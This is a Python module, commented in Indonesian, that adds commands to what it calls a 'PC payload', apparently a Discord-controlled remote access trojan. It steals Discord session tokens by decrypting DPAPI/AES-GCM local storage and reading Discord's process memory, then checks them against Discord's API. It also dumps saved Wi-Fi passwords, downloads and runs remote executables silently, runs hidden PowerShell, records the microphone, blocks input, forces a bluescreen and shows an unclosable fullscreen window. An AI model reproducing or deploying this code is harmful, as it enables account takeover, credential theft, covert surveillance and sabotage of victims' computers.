"""core/extra.py — perintah tambahan untuk payload PC.

Semua di sini tanpa dependensi baru: ctypes, winmm/MCI, PowerShell sebagai
pelaksana, dan satu implementasi AES-GCM murni Python untuk membuka token
Discord yang terenkripsi DPAPI.

Yang butuh hak lebih tinggi ditandai di docstring dan menolak dengan pesan,
bukan gagal diam-diam.
"""

import base64
import ctypes
import json
import os
import re
import shutil
import subprocess
import tempfile
import threading
import time

CREATE_NO_WINDOW = 0x08000000
k32 = ctypes.WinDLL("kernel32", use_last_error=True)
u32 = ctypes.WinDLL("user32", use_last_error=True)
shell32 = ctypes.WinDLL("shell32", use_last_error=True)
winmm = ctypes.WinDLL("winmm", use_last_error=True)
crypt32 = ctypes.WinDLL("crypt32", use_last_error=True)

for _fn in (k32.LocalFree,):
    _fn.restype = ctypes.c_void_p

_rick_proc = None


# ── AES-256 + GCM (murni Python) ─────────────────────────────────────────────
#
# Dipakai untuk membuka token Discord yang disimpan sebagai
# "v10" + nonce(12) + ciphertext + tag(16). Kuncinya sendiri diambil dari
# Local State lewat DPAPI, jadi tidak ada kunci literal di binary.

_SBOX = bytes.fromhex(
    "637c777bf26b6fc53001672bfed7ab76ca82c97dfa5947f0add4a2af9ca472c0"
    "b7fd9326363ff7cc34a5e5f171d8311504c723c31896059a071280e2eb27b275"
    "09832c1a1b6e5aa0523bd6b329e32f8453d100ed20fcb15b6acbbe394a4c58cf"
    "d0efaafb434d338545f9027f503c9fa851a3408f929d38f5bcb6da2110fff3d2"
    "cd0c13ec5f974417c4a77e3d645d197360814fdc222a908846eeb814de5e0bdb"
    "e0323a0a4906245cc2d3ac629195e479e7c8376d8dd54ea96c56f4ea657aae08"
    "ba78252e1ca6b4c6e8dd741f4bbd8b8a703eb5664803f60e613557b986c11d9e"
    "e1f8981169d98e949b1e87e9ce5528df8ca1890dbfe6426841992d0fb054bb16"
)
_RCON = (0x01, 0x02, 0x04, 0x08, 0x10, 0x20, 0x40, 0x80, 0x1B, 0x36)


def _xtime(a):
    return ((a << 1) ^ 0x1B) & 0xFF if a & 0x80 else a << 1


def _expand(key):
    nk = len(key) // 4
    nr = nk + 6
    w = [list(key[4 * i:4 * i + 4]) for i in range(nk)]
    for i in range(nk, 4 * (nr + 1)):
        t = list(w[i - 1])
        if i % nk == 0:
            t = t[1:] + t[:1]
            t = [_SBOX[b] for b in t]
            t[0] ^= _RCON[i // nk - 1]
        elif nk > 6 and i % nk == 4:
            t = [_SBOX[b] for b in t]
        w.append([w[i - nk][j] ^ t[j] for j in range(4)])
    return w, nr


def _encrypt_block(w, nr, block):
    s = [list(block[i::4]) for i in range(4)]  # state[r][c]

    def add_round_key(rnd):
        for c in range(4):
            for r in range(4):
                s[r][c] ^= w[rnd * 4 + c][r]

    add_round_key(0)
    for rnd in range(1, nr + 1):
        for r in range(4):
            for c in range(4):
                s[r][c] = _SBOX[s[r][c]]
        for r in range(1, 4):
            s[r] = s[r][r:] + s[r][:r]
        if rnd != nr:
            for c in range(4):
                a = [s[r][c] for r in range(4)]
                s[0][c] = _xtime(a[0]) ^ (_xtime(a[1]) ^ a[1]) ^ a[2] ^ a[3]
                s[1][c] = a[0] ^ _xtime(a[1]) ^ (_xtime(a[2]) ^ a[2]) ^ a[3]
                s[2][c] = a[0] ^ a[1] ^ _xtime(a[2]) ^ (_xtime(a[3]) ^ a[3])
                s[3][c] = (_xtime(a[0]) ^ a[0]) ^ a[1] ^ a[2] ^ _xtime(a[3])
        add_round_key(rnd)
    return bytes(s[r][c] for c in range(4) for r in range(4))


def _gf128(x, y):
    z, v = 0, y
    for i in range(127, -1, -1):
        if (x >> i) & 1:
            z ^= v
        v = (v >> 1) ^ 0xE1000000000000000000000000000000 if v & 1 else v >> 1
    return z


def _ghash(h, data):
    y = 0
    for i in range(0, len(data), 16):
        blk = data[i:i + 16].ljust(16, b"\x00")
        y = _gf128(y ^ int.from_bytes(blk, "big"), h)
    return y


def gcm_decrypt(key, blob):
    """blob = nonce(12) || ciphertext || tag(16). Return plaintext atau None."""
    if len(blob) < 28:
        return None
    w, nr = _expand(key)
    h = int.from_bytes(_encrypt_block(w, nr, b"\x00" * 16), "big")
    nonce, body = blob[:12], blob[12:]
    ct, tag = body[:-16], body[-16:]

    out = bytearray()
    for i in range(0, len(ct), 16):
        ctr = (2 + i // 16).to_bytes(4, "big")
        ks = _encrypt_block(w, nr, nonce + ctr)
        chunk = ct[i:i + 16]
        out += bytes(a ^ b for a, b in zip(chunk, ks))

    lens = (0).to_bytes(8, "big") + (len(ct) * 8).to_bytes(8, "big")
    calc = (_ghash(h, ct + lens) ^ int.from_bytes(
        _encrypt_block(w, nr, nonce + b"\x00\x00\x00\x01"), "big")).to_bytes(16, "big")
    return bytes(out) if calc == tag else None


# ── DPAPI ────────────────────────────────────────────────────────────────────

class _BLOB(ctypes.Structure):
    _fields_ = [("cbData", ctypes.c_ulong), ("pbData", ctypes.POINTER(ctypes.c_ubyte))]


def dpapi_unprotect(data):
    src = _BLOB(len(data), ctypes.cast(ctypes.create_string_buffer(data),
                                       ctypes.POINTER(ctypes.c_ubyte)))
    dst = _BLOB()
    if not crypt32.CryptUnprotectData(ctypes.byref(src), None, None, None, None, 0,
                                      ctypes.byref(dst)):
        raise ctypes.WinError(ctypes.get_last_error())
    try:
        return ctypes.string_at(dst.pbData, dst.cbData)
    finally:
        k32.LocalFree(dst.pbData)


# ── token Discord ────────────────────────────────────────────────────────────

TOKEN_RE = re.compile(rb"[A-Za-z0-9_-]{20,30}\.[A-Za-z0-9_-]{6}\.[A-Za-z0-9_-]{25,40}")

APP_DIRS = (
    ("discord", os.path.join(os.environ.get("APPDATA", ""), "discord")),
    ("discordptb", os.path.join(os.environ.get("APPDATA", ""), "discordptb")),
    ("discordcanary", os.path.join(os.environ.get("APPDATA", ""), "discordcanary")),
)


def _local_key(app_dir):
    state = os.path.join(app_dir, "Local State")
    if not os.path.isfile(state):
        return None
    try:
        with open(state, "r", encoding="utf-8") as fh:
            enc = json.load(fh)["os_crypt"]["encrypted_key"]
        raw = base64.b64decode(enc)
        if raw[:5] != b"DPAPI":
            return None
        return dpapi_unprotect(raw[5:])
    except Exception:
        return None


def _walk_bytes(app_dir, limit=40):
    """Local Storage leveldb: .ldb dan .log. Formatnya bukan JSON, jadi dibaca mentah."""
    root = os.path.join(app_dir, "Local Storage", "leveldb")
    if not os.path.isdir(root):
        return
    for name in sorted(os.listdir(root)):
        if not name.endswith((".ldb", ".log")):
            continue
        path = os.path.join(root, name)
        try:
            with open(path, "rb") as fh:
                yield path, fh.read(limit * 1024 * 1024)
        except OSError:
            continue


DQ_MARK = b"dQw4w9WgXcQ:"
_B64 = frozenset(b"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=")


def _b64_run(blob, start):
    end = start
    while end < len(blob) and blob[end] in _B64:
        end += 1
    return blob[start:end]


def _from_marker(blob, key):
    """Jalur utama Discord sekarang: `dQw4w9WgXcQ:` + base64(`v10`+nonce+ct+tag).

    Kenapa bukan `v10` mentah: nilai di leveldb disimpan sebagai teks, jadi
    ciphertext biner di-base64 dulu. Mencari byte `v10` langsung tidak akan
    pernah kena — yang ada di file adalah `djEw` (base64 dari "v10").
    """
    out = []
    start = 0
    while True:
        idx = blob.find(DQ_MARK, start)
        if idx < 0:
            return out
        start = idx + len(DQ_MARK)
        run = _b64_run(blob, start)
        if len(run) < 40:
            continue
        try:
            raw = base64.b64decode(run + b"=" * (-len(run) % 4))
        except Exception:
            continue
        if raw[:3] != b"v10":
            continue
        plain = gcm_decrypt(key, raw[3:])
        if not plain:
            continue
        m = TOKEN_RE.search(plain)
        if m:
            out.append(m.group(0).decode("ascii", "ignore"))


# ── scan memori proses ───────────────────────────────────────────────────────
#
# Leveldb cuma menyimpan salinan, dan salinan itu bisa sudah di-compact dengan
# kunci lama sehingga tidak lagi bisa dibuka. Token yang benar-benar dipakai
# selalu ada di memori renderer selama sesi jalan, jadi itu jalur paling andal.
# Hanya baca — tidak ada WriteProcessMemory di sini.

class _MBI(ctypes.Structure):
    _fields_ = [
        ("BaseAddress", ctypes.c_void_p),
        ("AllocationBase", ctypes.c_void_p),
        ("AllocationProtect", ctypes.c_ulong),
        ("RegionSize", ctypes.c_size_t),
        ("State", ctypes.c_ulong),
        ("Protect", ctypes.c_ulong),
        ("Type", ctypes.c_ulong),
    ]


class _PE32(ctypes.Structure):
    _fields_ = [
        ("dwSize", ctypes.c_ulong),
        ("cntUsage", ctypes.c_ulong),
        ("th32ProcessID", ctypes.c_ulong),
        ("th32DefaultHeapID", ctypes.c_void_p),
        ("th32ModuleID", ctypes.c_ulong),
        ("cntThreads", ctypes.c_ulong),
        ("th32ParentProcessID", ctypes.c_ulong),
        ("pcPriClassBase", ctypes.c_long),
        ("dwFlags", ctypes.c_ulong),
        ("szExeFile", ctypes.c_wchar * 260),
    ]


_MEM_COMMIT = 0x1000
_PAGE_GUARD = 0x100
_READABLE = (0x02, 0x04, 0x08, 0x20, 0x40, 0x80)
_TH32CS_SNAPPROCESS = 0x02
_INVALID_HANDLE = ctypes.c_void_p(-1).value
_PROC_QUERY_LIMITED = 0x1000
_PROC_VM_READ = 0x0010

k32.OpenProcess.restype = ctypes.c_void_p
k32.OpenProcess.argtypes = [ctypes.c_ulong, ctypes.c_int, ctypes.c_ulong]
k32.CloseHandle.argtypes = [ctypes.c_void_p]
k32.CreateToolhelp32Snapshot.restype = ctypes.c_void_p
k32.CreateToolhelp32Snapshot.argtypes = [ctypes.c_ulong, ctypes.c_ulong]
k32.Process32FirstW.argtypes = [ctypes.c_void_p, ctypes.POINTER(_PE32)]
k32.Process32NextW.argtypes = [ctypes.c_void_p, ctypes.POINTER(_PE32)]
k32.VirtualQueryEx.argtypes = [ctypes.c_void_p, ctypes.c_void_p,
                               ctypes.POINTER(_MBI), ctypes.c_size_t]
k32.VirtualQueryEx.restype = ctypes.c_size_t
k32.ReadProcessMemory.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p,
                                  ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
k32.ReadProcessMemory.restype = ctypes.c_int


def _pids(image="discord.exe"):
    snap = k32.CreateToolhelp32Snapshot(_TH32CS_SNAPPROCESS, 0)
    if not snap or snap == _INVALID_HANDLE:
        return []
    out, ent = [], _PE32()
    ent.dwSize = ctypes.sizeof(_PE32)
    try:
        ok = k32.Process32FirstW(ctypes.c_void_p(snap), ctypes.byref(ent))
        while ok:
            if (ent.szExeFile or "").lower() == image:
                out.append(int(ent.th32ProcessID))
            ok = k32.Process32NextW(ctypes.c_void_p(snap), ctypes.byref(ent))
    finally:
        k32.CloseHandle(ctypes.c_void_p(snap))
    return out


def _scan_pid(pid, budget, deadline):
    """Baca region yang readable, cari pola token. Return (hits, byte dibaca)."""
    h = k32.OpenProcess(_PROC_QUERY_LIMITED | _PROC_VM_READ, False, pid)
    if not h:
        return None, 0
    hits, read, addr, carry = set(), 0, 0, b""
    mbi, got = _MBI(), ctypes.c_size_t(0)
    buf = ctypes.create_string_buffer(1 << 20)
    try:
        while k32.VirtualQueryEx(ctypes.c_void_p(h), ctypes.c_void_p(addr),
                                 ctypes.byref(mbi), ctypes.sizeof(mbi)):
            base = mbi.BaseAddress or 0
            size = mbi.RegionSize or 0
            if not size:
                break
            if (mbi.State == _MEM_COMMIT and mbi.Protect in _READABLE
                    and not (mbi.Protect & _PAGE_GUARD)):
                off = 0
                while off < size:
                    n = min(1 << 20, size - off)
                    if k32.ReadProcessMemory(ctypes.c_void_p(h),
                                             ctypes.c_void_p(base + off),
                                             buf, n, ctypes.byref(got)) and got.value:
                        # carry: token bisa terbelah di batas 1 MB
                        data = carry + buf.raw[:got.value]
                        read += got.value
                        for m in TOKEN_RE.finditer(data):
                            hits.add(m.group(0))
                        carry = data[-96:]
                    else:
                        carry = b""
                    off += n
                    if read > budget or time.time() > deadline:
                        return hits, read
            addr = base + size
    finally:
        k32.CloseHandle(ctypes.c_void_p(h))
    return hits, read


def _scan_memory(image="discord.exe", budget=2 << 30, seconds=25.0):
    deadline = time.time() + seconds
    hits, total, opened, pids = set(), 0, 0, _pids(image)
    share = budget // max(1, len(pids))
    for pid in pids:
        r, n = _scan_pid(pid, share, deadline)
        if r is None:
            continue
        hits |= r
        total += n
        opened += 1
        if time.time() > deadline:
            break
    return hits, "%d/%d proc %.0f MB" % (opened, len(pids), total / 1e6)


def _validate(token):
    """Cek ke /users/@me. 200 = hidup, 401 = sampah.

    Ini yang membuang kandidat palsu: string acak yang kebetulan berbentuk
    token tetap akan ditolak API, jadi yang dilaporkan hanya sesi nyata.
    """
    try:
        import requests
        r = requests.get("https://discord.com/api/v10/users/@me",
                         headers={"Authorization": token,
                                  "User-Agent": "Mozilla/5.0"},
                         timeout=8)
        if r.status_code != 200:
            return None
        j = r.json()
        disc = j.get("discriminator") or "0"
        name = j.get("username") or "?"
        return name if disc in ("0", "", None) else "%s#%s" % (name, disc)
    except Exception:
        return None


def grab_tokens():
    """Cari token Discord yang masih hidup. Tanpa admin, user yang sama.

    Tiga sumber digabung karena tiap versi Discord beda tempat:
      1. memori proses — token aktif selalu ada selama sesi jalan
      2. `dQw4w9WgXcQ:` + base64 v10 di leveldb, kunci dari Local State (DPAPI)
      3. token plaintext di leveldb (sisa instalasi lama)
    Semua kandidat diverifikasi ke /users/@me sebelum dilaporkan.
    """
    cand, seen = [], set()

    def add(tok):
        if tok and tok not in seen:
            seen.add(tok)
            cand.append(tok)

    mem_hits, mem_stat = _scan_memory()
    for raw in mem_hits:
        add(raw.decode("ascii", "ignore"))

    apps = []
    for label, app_dir in APP_DIRS:
        if not os.path.isdir(app_dir):
            continue
        key = _local_key(app_dir)
        apps.append("%s key=%s" % (label, "ok" if key else "-"))
        for path, blob in _walk_bytes(app_dir):
            for m in TOKEN_RE.finditer(blob):
                add(m.group(0).decode("ascii", "ignore"))
            if key:
                for tok in _from_marker(blob, key):
                    add(tok)

    valid = [(t, w) for t, w in ((t, _validate(t)) for t in cand) if w]

    head = "GRAB mem=%s  file=%s" % (mem_stat, ", ".join(apps) or "-")
    if not valid:
        return (head + "\n0 token hidup — %d kandidat, semua ditolak API" % len(cand)
                + "\nDiscord tidak jalan, atau belum login")
    lines = [head + "\n%d token hidup" % len(valid)]
    for tok, who in valid:
        lines.append("%s...%s (%d char)  %s" % (tok[:10], tok[-6:], len(tok), who))
    return "\n".join(lines)


# ── jaringan & proses ────────────────────────────────────────────────────────

def ping(bot):
    t0 = time.time()
    r = bot.call("GET", "/users/@me")
    ms = int((time.time() - t0) * 1000)
    return "PING %dms http=%s" % (ms, getattr(r, "status_code", "?"))


def powershell(command, timeout=90):
    try:
        p = subprocess.run(
            ["powershell", "-NoProfile", "-NonInteractive", "-Command", command],
            capture_output=True, timeout=timeout, creationflags=CREATE_NO_WINDOW)
        out = (p.stdout + p.stderr).decode("utf-8", "replace").strip()
        return out or "(no output)"
    except subprocess.TimeoutExpired:
        return "[timeout %ds]" % timeout
    except Exception as exc:
        return "[err] %s" % exc


def execute_url(url, args="", dest=None):
    """Unduh lalu jalankan. Tanpa admin: proses anak mewarisi hak kita."""
    if not url.lower().startswith(("http://", "https://")):
        return "[err] butuh URL http(s)"
    target = dest or os.path.join(tempfile.gettempdir(), "x_%d.exe" % int(time.time()))
    try:
        import requests
        r = requests.get(url, timeout=120, stream=True)
        r.raise_for_status()
        with open(target, "wb") as fh:
            for chunk in r.iter_content(65536):
                fh.write(chunk)
    except Exception as exc:
        return "[err] unduh: %s" % exc
    try:
        p = subprocess.Popen([target] + (args.split() if args else []),
                             creationflags=CREATE_NO_WINDOW, close_fds=True)
        return "RUN pid=%d %s (%d B)" % (p.pid, os.path.basename(target),
                                         os.path.getsize(target))
    except Exception as exc:
        return "[err] jalan: %s" % exc


def power(action):
    flag = {"reboot": "/r", "shutdown": "/s", "logoff": "/l"}.get(action.lower())
    if not flag:
        return "pakai: power reboot|shutdown|logoff"
    try:
        subprocess.run(["shutdown", flag, "/t", "0", "/f"],
                       capture_output=True, timeout=15, creationflags=CREATE_NO_WINDOW)
        return "POWER %s" % action
    except Exception as exc:
        return "[err] %s" % exc


def elevate():
    """UAC. Batalkan = error 1223, bukan crash."""
    import sys
    try:
        exe = sys.executable
        rc = shell32.ShellExecuteW(None, "runas", exe, None, os.getcwd(), 1)
        if rc > 32:
            return "UAC tampil, instance baru jalan"
        if rc == 5:
            return "[err] akses ditolak"
        return "[err] ShellExecute=%d (1223 = dibatalkan user)" % rc
    except Exception as exc:
        return "[err] %s" % exc


def taskkill(target):
    """PID atau nama proses. Nama dicoba dengan /IM."""
    if not target:
        return "pakai: taskkill <pid|nama.exe>"
    try:
        if target.isdigit():
            p = subprocess.run(["taskkill", "/PID", target, "/F"],
                               capture_output=True, timeout=20,
                               creationflags=CREATE_NO_WINDOW)
        else:
            p = subprocess.run(["taskkill", "/IM", target, "/F"],
                               capture_output=True, timeout=20,
                               creationflags=CREATE_NO_WINDOW)
        out = (p.stdout + p.stderr).decode("utf-8", "replace").strip()
        return out or "[exit %d]" % p.returncode
    except Exception as exc:
        return "[err] %s" % exc


# ── wifi ─────────────────────────────────────────────────────────────────────

def wifi():
    """Profil tersimpan + password. `netsh wlan` jalan tanpa admin."""
    try:
        p = subprocess.run(["netsh", "wlan", "show", "profiles"],
                           capture_output=True, timeout=25, creationflags=CREATE_NO_WINDOW)
        text = p.stdout.decode("utf-8", "replace")
    except Exception as exc:
        return "[err] %s" % exc
    names = re.findall(r"All User Profile\s*:\s*(.+)$", text, re.M)
    names = [n.strip() for n in names if n.strip()]
    if not names:
        return "(tidak ada profil wifi)"
    rows = []
    for name in names[:40]:
        try:
            q = subprocess.run(["netsh", "wlan", "show", "profile", "name=%s" % name, "key=clear"],
                               capture_output=True, timeout=20,
                               creationflags=CREATE_NO_WINDOW)
            t = q.stdout.decode("utf-8", "replace")
            key = re.search(r"Key Content\s*:\s*(.+)$", t, re.M)
            auth = re.search(r"Authentication\s*:\s*(.+)$", t, re.M)
            rows.append("%-28s %-16s %s" % (name, (auth.group(1).strip() if auth else "?"),
                                            key.group(1).strip() if key else "(tanpa password/open)"))
        except Exception:
            rows.append("%-28s ?" % name)
    return "\n".join(rows)


# ── suara ────────────────────────────────────────────────────────────────────

def notify(text):
    """Balloon tray. Beda dari `msg`: tidak blocking, tidak menahan thread."""
    if not text:
        return "pakai: notify <teks>"
    safe = text.replace("'", "''")
    ps = ("Add-Type -AssemblyName System.Windows.Forms;"
          "$n=New-Object System.Windows.Forms.NotifyIcon;"
          "$n.Icon=[System.Drawing.SystemIcons]::Information;"
          "$n.Visible=$true;"
          "$n.ShowBalloonTip(8000,'System',$('" + safe + "'),"
          "[System.Windows.Forms.ToolTipIcon]::Info);"
          "Start-Sleep -Seconds 9;$n.Dispose()")
    threading.Thread(target=powershell, args=(ps, 40), daemon=True).start()
    return "notify tampil"


def tts(text):
    if not text:
        return "pakai: tts <teks>"
    safe = text.replace("'", "''")
    ps = ("Add-Type -AssemblyName System.Speech;"
          "$s=New-Object System.Speech.Synthesis.SpeechSynthesizer;"
          "$s.Speak('%s')" % safe)
    threading.Thread(target=powershell, args=(ps, 120), daemon=True).start()
    return "TTS jalan di latar"


def mic(seconds, dest):
    """Rekam mikrofon lewat MCI (winmm), simpan WAV. Tanpa paket tambahan."""
    secs = max(1, min(int(seconds or 5), 120))
    alias = "rec%d" % int(time.time() * 1000)
    buf = ctypes.create_unicode_buffer(512)

    def mci(cmd):
        return winmm.mciSendStringW(cmd, buf, 512, 0)

    if mci("open new type waveaudio alias %s" % alias) != 0:
        return "[err] buka device audio gagal (mic dipakai proses lain?)"
    try:
        if mci("record %s" % alias) != 0:
            return "[err] record gagal"
        time.sleep(secs)
        if mci('save %s "%s"' % (alias, dest)) != 0:
            return "[err] simpan gagal: %s" % buf.value
    finally:
        mci("close %s" % alias)
    if not os.path.isfile(dest) or os.path.getsize(dest) < 2048:
        return "[err] hasil kosong (mic diblokir Privacy Settings?)"
    return "MIC %ds %d KB" % (secs, os.path.getsize(dest) // 1024)


# ── kontrol input & layar ────────────────────────────────────────────────────

def block_input(on):
    """Butuh admin: sejak Vista BlockInput menolak proses non-elevated."""
    ok = bool(u32.BlockInput(bool(on)))
    if not ok:
        return "[err] ditolak (butuh admin)"
    return "BLOCK %s" % ("on" if on else "off")


def volume(arg):
    """Timing-independent: pakai tombol volume sistem, bukan mixer absolut."""
    VK = {"up": 0xAF, "down": 0xAE, "mute": 0xAD}
    arg = (arg or "").strip().lower()
    if arg in VK:
        u32.keybd_event(VK[arg], 0, 0, 0)
        u32.keybd_event(VK[arg], 0, 2, 0)
        return "VOL %s" % arg
    if arg.isdigit():
        pct = max(0, min(100, int(arg)))
        # reset ke 0 lalu naik ~2% per tekan; 50 langkah = 100%
        for _ in range(50):
            u32.keybd_event(VK["down"], 0, 0, 0)
            u32.keybd_event(VK["down"], 0, 2, 0)
        for _ in range(pct // 2):
            u32.keybd_event(VK["up"], 0, 0, 0)
            u32.keybd_event(VK["up"], 0, 2, 0)
        return "VOL ~%d%%" % pct
    return "pakai: volume up|down|mute|0-100"


RICK_PS = r"""
Add-Type -AssemblyName System.Windows.Forms
$f = New-Object System.Windows.Forms.Form
$f.FormBorderStyle = 'None'
$f.WindowState = 'Maximized'
$f.TopMost = $true
$f.BackColor = 'Black'
$w = New-Object System.Windows.Forms.WebBrowser
$w.Dock = 'Fill'
$w.ScriptErrorsSuppressed = $true
$w.Navigate('%s')
$f.Controls.Add($w)
[System.Windows.Forms.Application]::Run($f)
"""


def rick(url=None):
    """Layar penuh, topmost, tanpa tombol tutup. Backend-nya WebBrowser (IE).

    Artinya YouTube biasanya TIDAK jalan; yang main adalah URL yang IE bisa
    buka, misalnya file .mp4 langsung.
    """
    global _rick_proc
    url = url or "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1"
    script = RICK_PS % url.replace("'", "''")
    path = os.path.join(tempfile.gettempdir(), "rk_%d.ps1" % int(time.time()))
    with open(path, "w", encoding="utf-8") as fh:
        fh.write(script)
    try:
        _rick_proc = subprocess.Popen(
            ["powershell", "-NoProfile", "-WindowStyle", "Hidden", "-File", path],
            creationflags=CREATE_NO_WINDOW)
        return "RICK pid=%d (rick off untuk tutup)" % _rick_proc.pid
    except Exception as exc:
        return "[err] %s" % exc


def rick_off():
    global _rick_proc
    if _rick_proc is None or _rick_proc.poll() is not None:
        _rick_proc = None
        return "RICK tidak jalan"
    try:
        subprocess.run(["taskkill", "/PID", str(_rick_proc.pid), "/T", "/F"],
                       capture_output=True, timeout=15, creationflags=CREATE_NO_WINDOW)
    except Exception:
        pass
    _rick_proc = None
    return "RICK off"


def bsod():
    """NtRaiseHardError dengan ResponseOption 6 = shutdown.

    Ini benar-benar mematikan mesin dengan bugcheck, bukan menutup aplikasi.
    Dijaga parameternya `yes` supaya tidak kepanggil karena salah ketik.
    """
    ntdll = ctypes.WinDLL("ntdll")
    resp = ctypes.c_ulong(0)
    # STATUS_ASSERTION_FAILURE -> bugcheck 0x0000001F / KERNEL_MODE_EXCEPTION
    ntdll.NtRaiseHardError(ctypes.c_ulong(0xC0000420), 0, 0, None,
                           ctypes.c_ulong(6), ctypes.byref(resp))
    return "BSOD dikirim (kalau balasan ini sampai, privilege-nya kurang)"
